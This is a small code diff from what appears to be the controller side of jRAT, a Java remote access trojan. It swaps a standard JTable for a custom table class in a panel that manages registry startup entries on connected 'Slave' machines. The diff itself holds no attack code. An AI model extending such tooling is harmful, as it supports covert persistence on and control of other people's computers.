@@ -15,6 +15,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet78RegistryStartup;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -77,7 +78,7 @@ public class PanelControlRegStart extends PanelControlParent {
 					.addContainerGap(13, Short.MAX_VALUE))
 		);
 
-		table = new JTable() {
+		table = new DefaultJTable() {
 			@SuppressWarnings({ "unchecked", "rawtypes" })
 			@Override
 			public Class getColumnClass(int column) {
